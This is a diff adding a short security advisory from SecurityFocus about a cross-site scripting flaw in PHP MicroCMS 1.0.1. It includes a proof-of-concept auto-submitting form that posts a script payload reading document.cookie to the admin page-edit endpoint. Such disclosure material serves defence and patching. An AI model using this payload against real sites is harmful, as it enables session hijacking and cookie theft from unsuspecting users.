@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/45702/info
+
+PHP MicroCMS is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+PHP MicroCMS 1.0.1 is vulnerable; other versions may be affected. 
+
+<form action="http://host/index.php?admin=static_pages_edit&pk=home" method="post" name="main">
+<input type="hidden" name="pk" value="home">
+<input type="hidden" name="page_title" value="Welcome to PHP MicroCMS">
+<input type="hidden" name="page_text" value="text<script>alert(document.cookie)</script>">
+<input type="hidden" name="subSavePage" value="Save Changes">
+</form>
+<script>
+document.main.submit();
+</script>
